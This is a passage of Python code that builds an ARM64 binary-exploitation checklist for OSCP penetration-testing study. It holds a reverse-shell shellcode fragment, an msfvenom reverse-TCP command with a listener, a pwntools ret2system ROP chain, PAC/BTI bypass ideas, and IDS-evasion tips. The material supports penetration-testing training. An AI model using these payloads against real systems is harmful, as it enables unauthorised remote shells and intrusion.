    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59              ; __NR_execve (x8 Linux, x16 macOS)
    svc  #0x1337

CUSTOMIZATION:
1. Change IP: Modify movk for sin_addr
   - 192.168.1.1: #0x00C0, #0xA801

2. Change port: Modify 0x115C (4444 in hex)
   - Port 8080: 0x1F90
   - Port 443: 0x01BB

MSFVENOM GENERATION:
msfvenom -p linux/aarch64/shell_reverse_tcp \\
         LHOST=192.168.45.X LPORT=4444 \\
         -f python -b '\\x00\\x0a\\x0d'

LISTENER:
nc -lvnp 4444

INTEGRATION:
shellcode = b"\\x..." # from assembly/msfvenom
payload = b"A" * offset + p64(stack_addr) + shellcode
                ''',
                'success_indicators': [
                    'Connection received on listener',
                    'Shell prompt appears',
                    'Commands execute remotely'
                ],
                'failure_indicators': [
                    'Connection refused (wrong IP/port)',
                    'Shellcode crashes binary',
                    'Firewall blocks connection'
                ],
                'next_steps': [
                    'Test locally before remote deployment',
                    'Add encryption for IDS evasion',
                    'Stage larger payloads if size limited',
                    'Use DNS tunneling for restrictive networks'
                ],
                'alternatives': [
                    'Bind shell (wait for incoming connection)',
                    'Meterpreter staged payload',
                    'Custom C2 protocol'
                ]
            }
        })

        tasks['children'].append(shellcode_dev)

        # ===== PHASE 6: ADVANCED TOPICS =====
        advanced = {
            'id': f'arm64-advanced-{port}',
            'name': 'Advanced ARM64 Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 6.1: ROP chain development
        advanced['children'].append({
            'id': f'rop-chain-arm64-{port}',
            'name': 'ROP Chain Development',
            'type': 'manual',
            'metadata': {
                'description': 'Return-Oriented Programming for ARM64 with NX enabled',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'notes': '''ARM64 ROP Chain Construction:

WHEN TO USE:
- NX enabled (stack not executable)
- Need to call system("/bin/sh")
- Chain existing code gadgets

GADGET HUNTING:
# Using ROPgadget
ROPgadget --binary <BINARY_PATH> --arch arm64

# Using ropper
ropper --file <BINARY_PATH> --arch arm64

# Find specific gadgets:
ROPgadget --binary binary --only "pop|ret"

CRITICAL ARM64 GADGETS:
- pop {x0-x7}; ret     ; Load syscall arguments
- mov x0, sp; ret      ; Point to stack data
- ldr x0, [x1]; ret    ; Load from memory
- add sp, sp, #N; ret  ; Stack pivot
- bl x8; ret           ; Call function pointer
- ret                  ; Simple return

AARCH64 ROP CONSIDERATIONS:
1. Stack must be 16-byte aligned
2. Use ldp/stp for loading pairs
3. x30 (LR) holds return address
4. Gadgets often in libc or binary

EXAMPLE: ret2system
# Find system() in libc
readelf -s /lib/aarch64-linux-gnu/libc.so.6 | grep system

# Find "/bin/sh" string
strings -a -t x /lib/aarch64-linux-gnu/libc.so.6 | grep /bin/sh

# ROP chain:
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/aarch64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Gadgets
pop_x0_ret = 0x... # pop {x0}; ret
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

# Chain
payload = b"A" * offset
payload += p64(pop_x0_ret)
payload += p64(binsh_addr)  # x0 = "/bin/sh"
payload += p64(system_addr)

DEBUGGING ROP:
gdb-multiarch ./binary
(gdb) x/20gx $sp  # View stack gadgets
(gdb) si          # Step through each gadget
(gdb) info reg    # Check register values

COMMON ISSUES:
- Stack misalignment (16-byte boundary)
- Gadgets clobber needed registers
- ASLR requires libc leak
- Cache/branch predictor interference
                ''',
                'success_indicators': [
                    'Gadgets found for all needed operations',
                    'ROP chain executes without crash',
                    'System function called successfully'
                ],
                'failure_indicators': [
                    'Insufficient gadgets available',
                    'Stack alignment crashes',
                    'ASLR prevents reliable exploitation'
                ],
                'next_steps': [
                    'Add info leak to defeat ASLR',
                    'Use ret2plt for partial ASLR bypass',
                    'Consider JOP if ROP detection active',
                    'Research ARM64-specific ROP mitigations'
                ],
                'alternatives': [
                    'Ret2libc (simpler, single function call)',
                    'JOP (Jump-Oriented Programming)',
                    'DOP (Data-Oriented Programming)'
                ]
            }
        })

        # Task 6.2: PAC/BTI bypass techniques
        advanced['children'].append({
            'id': f'pac-bti-bypass-{port}',
            'name': 'PAC/BTI Bypass Techniques',
            'type': 'manual',
            'metadata': {
                'description': 'Advanced techniques to bypass ARM64 Branch Protection',
                'tags': ['OSCP:LOW', 'RESEARCH'],
                'notes': '''ARM64 PAC/BTI Bypass Research:

POINTER AUTHENTICATION (PAC):
- Signs return addresses with cryptographic MAC
- autiasp validates x30 before ret
- Naive overwrites fail authentication check

PAC BYPASS STRATEGIES:
1. Avoid ret instructions:
   - Target function pointers (not signed)
   - Use exception handlers
   - Corrupt non-return control flow

2. Key reuse attack:
   - Find signed pointer
   - Reuse in different context
   - Requires key oracle

3. Brute force (limited):
   - PAC uses only 7-16 bits
   - 2^7 = 128 attempts possible
   - Network service restart required

BRANCH TARGET IDENTIFICATION (BTI):
- Landing pads at function entries (bti c)
- Indirect branches must target bti c
- SIGILL if invalid target

BTI BYPASS:
1. Target valid landing pads only:
   - All function entries have bti c
   - Build ROP from function prologues
   - More restrictive gadget set

2. Exception-based:
   - Trigger exception handlers
   - Exception returns bypass BTI
   - Complex setup required

DETECTION:
# Check for PAC instructions
objdump -d binary | grep -E "paciasp|autiasp"

# Check for BTI instructions
objdump -d binary | grep "bti c"

# Check ELF notes
readelf --notes binary | grep AARCH64

PRACTICAL APPROACH:
- Rebuild binary without -mbranch-protection
- Focus on non-PAC/BTI targets for OSCP
- Research for advanced CTF challenges
- Use function pointer overwrites

REFERENCES:
- Qualcomm PAC whitepaper
- ARM Branch Protection specification
- @_cryastal PAC bypass research
                ''',
                'success_indicators': [
                    'PAC/BTI presence identified',
                    'Valid bypass strategy selected',
                    'Proof-of-concept successful'
                ],
                'failure_indicators': [
                    'All bypass attempts fail',
                    'Insufficient side-channel info',
                    'Mitigation too strong'
                ],
                'next_steps': [
                    'Focus on easier targets for OSCP',
                    'Research latest bypass techniques',
                    'Practice on CTF challenges',
                    'Contribute findings to community'
                ],
                'alternatives': [
                    'Target older ARM64 without PAC/BTI',
                    'Exploit logic bugs instead of memory corruption',
                    'Use social engineering for initial access'
                ]
            }
        })

        # Task 6.3: Cross-architecture testing
        advanced['children'].append({
            'id': f'cross-arch-testing-{port}',
            'name': 'Cross-Architecture Testing (QEMU)',
            'type': 'command',
            'metadata': {
                'command': 'qemu-aarch64 -L /usr/aarch64-linux-gnu <BINARY_PATH>',
                'description': 'Run ARM64 binaries on x86 host using QEMU user-mode emulation',
                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                'flag_explanations': {
                    'qemu-aarch64': 'QEMU user-mode emulator for ARM64',
                    '-L': 'Set library path for ARM64 shared libraries',
                    '/usr/aarch64-linux-gnu': 'ARM64 cross-compilation toolchain libs'
                },
                'success_indicators': [
                    'Binary executes on x86 host',
                    'Can interact with stdin/stdout',
                    'Exploits work same as native ARM64'
                ],
                'failure_indicators': [
                    'qemu-aarch64 not installed',
                    'Missing ARM64 libraries',
                    'Syscall emulation errors'
                ],
                'next_steps': [
                    'Test exploits locally before deployment',
                    'Debug with qemu-aarch64 -g for gdbserver',
                    'Connect gdb-multiarch for debugging',
                    'Verify payloads work on real ARM64'
                ],
                'alternatives': [
                    'Docker with ARM64 base image',
                    'Remote ARM64 server access',
                    'Raspberry Pi for native testing',
                    'Cloud ARM64 instances (AWS Graviton)'
                ],
                'notes': 'Install: apt install qemu-user qemu-user-static libc6-arm64-cross. Debug: qemu-aarch64 -g 1234 binary & then gdb-multiarch -ex "target remote :1234"'
            }
        })

        tasks['children'].append(advanced)

        # ===== PHASE 7: OSCP EXAM TIPS =====
        oscp_tips = {
            'id': f'arm64-oscp-tips-{port}',
            'name': 'ARM64 Exploitation - OSCP Exam Tips',
            'type': 'manual',
            'metadata': {
                'description': 'Practical ARM64 exploitation tips for OSCP exam',
                'tags': ['OSCP:HIGH', 'REFERENCE'],
                'notes': '''ARM64 Binary Exploitation - OSCP Exam Strategy:

LIKELIHOOD IN OSCP:
- Low probability (mostly x86/x64)
- If present, likely easier challenge
- Focus on fundamentals, not advanced bypasses

TIME MANAGEMENT:
1. Quick checks (5 mins):
   - file binary → confirm ARM64
   - checksec → identify low-hanging fruit
   - strings → look for obvious flags

2. If simple (no PAC/BTI/PIE):
   - Spend 30-60 mins on exploitation
   - Ret2win or stack overflow likely

3. If complex (PAC/BTI enabled):
   - Skip if time-constrained
   - Return after other boxes completed

ESSENTIAL COMMANDS:
# Architecture check
file binary

# Security features
checksec --file=binary

# Find offset
python3 -c "from pwn import *; print(cyclic(200).decode())"

# Basic ret2win
objdump -d binary | grep win

# Test exploit locally
qemu-aarch64 -L /usr/aarch64-linux-gnu ./binary

COMMON OSCP SCENARIOS:
1. Ret2win (no PIE):
   - Find win address
   - Calculate offset
   - Send payload

2. Stack overflow with leak:
   - Binary prints address
   - Calculate offset
   - Craft payload

3. Simple buffer overflow:
   - NX disabled
   - Use pwntools shellcode
   - Adjust stack address

TOOLS TO HAVE READY:
- gdb-multiarch + GEF/PEDA
- pwntools (Python 3)
- qemu-aarch64 + ARM64 toolchain
- ROPgadget / ropper
- checksec

DEBUGGING WORKFLOW:
1. Run locally with QEMU
2. Use gdb-multiarch for debugging
3. Test offset with pattern
4. Verify payload locally
5. Deploy against target

DOCUMENTATION:
- Screenshot checksec output
- Document offset calculation
- Save exploit script
- Note all attempts (success/failure)

RED FLAGS (skip if present):
- PAC/BTI enabled (advanced)
- No obvious win function
- Heavy input filtering
- Time constraint already tight

QUICK WINS:
- No PIE + No Canary = easy ret2win
- NX disabled = shellcode on stack
- Address leak provided = PIE bypass
- ASLR disabled = static addresses

REMEMBER:
- ARM64 is just different architecture
- Same exploitation concepts apply
- x0-x7 for args (vs rdi, rsi, rdx...)
- x30 is return address (vs rip)
- 16-byte stack alignment critical
                ''',
                'success_indicators': [],
                'failure_indicators': [],
                'next_steps': [],
                'alternatives': []
            }
        }

        tasks['children'].append(oscp_tips)

        return tasks
